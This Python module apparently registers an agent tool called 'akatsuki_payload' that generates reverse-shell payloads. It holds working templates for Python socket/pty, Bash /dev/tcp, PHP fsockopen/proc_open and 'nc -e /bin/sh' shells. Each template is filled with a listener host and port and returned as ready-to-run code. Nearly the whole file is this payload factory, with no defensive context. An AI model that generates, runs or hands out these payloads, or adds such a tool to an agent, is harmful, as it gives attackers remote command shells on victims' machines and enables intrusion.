import json
import logging
from datetime import datetime
from tools.registry import registry, tool_error, tool_result

logger = logging.getLogger(__name__)

REVERSE_PYTHON = 'import socket,subprocess,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("{LHOST}",{LPORT}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn("/bin/sh")'
REVERSE_BASH = 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
REVERSE_PHP = '<?php $s=fsockopen("{LHOST}",{LPORT});$p=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);proc_close($p);?>'
REVERSE_NETCAT = 'nc -e /bin/sh {LHOST} {LPORT}'

PAYLOAD_TEMPLATES = {
    "python": (REVERSE_PYTHON, ".py"),
    "bash": (REVERSE_BASH, ".sh"),
    "php": (REVERSE_PHP, ".php"),
    "netcat": (REVERSE_NETCAT, ".sh"),
}

def _generate(ptype, lhost, lport):
    template, ext = PAYLOAD_TEMPLATES[ptype]
    code = template.format(LHOST=lhost, LPORT=lport)
    return "# AKATSUKI Payload\n# Generated: " + datetime.now().isoformat() + "\n" + code, ext

AKATSUKI_PAYLOAD_SCHEMA = {
    "name": "akatsuki_payload",
    "description": "AKATSUKI Payload Factory - generate reverse shell payloads in multiple languages (python, bash, php, netcat).",
    "parameters": {
        "type": "object",
        "properties": {
            "payload_type": {
                "type": "string",
                "enum": ["python", "bash", "php", "netcat"],
                "description": "Payload language/type",
            },
            "lhost": {
                "type": "string",
                "description": "Listener host (IP or domain)",
            },
            "lport": {
                "type": "integer",
                "description": "Listener port",
            },
        },
        "required": ["payload_type", "lhost", "lport"],
    },
}

def _validate_ip_or_domain(val: str) -> str:
    import re
    val = val.strip()[:255]
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    domain_pattern = r"^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"
    if re.match(ip_pattern, val):
        parts = val.split(".")
        if all(0 <= int(p) <= 255 for p in parts):
            return val
    if re.match(domain_pattern, val):
        return val
    raise ValueError(f"Invalid host: {val}")


def akatsuki_payload(payload_type, lhost, lport):
    if payload_type not in PAYLOAD_TEMPLATES:
        return tool_error("Unknown payload type: " + payload_type)
    try:
        lhost = _validate_ip_or_domain(lhost)
    except ValueError as e:
        return tool_error(str(e))
    try:
        lport = int(lport)
        if lport < 1 or lport > 65535:
            return tool_error("Port must be between 1 and 65535")
    except (ValueError, TypeError):
        return tool_error("Port must be a valid integer")
    code, ext = _generate(payload_type, lhost, lport)
    return tool_result({
        "payload_type": payload_type,
        "lhost": lhost,
        "lport": lport,
        "extension": ext,
        "code": code,
        "size_bytes": len(code),
    })

def check_akatsuki_payload_requirements():
    return True

registry.register(
    name="akatsuki_payload",
    toolset="akatsuki",
    schema=AKATSUKI_PAYLOAD_SCHEMA,
    handler=lambda args, **kw: akatsuki_payload(
        payload_type=args["payload_type"],
        lhost=args["lhost"],
        lport=args["lport"],
    ),
    check_fn=check_akatsuki_payload_requirements,
    emoji="\u2764",
)
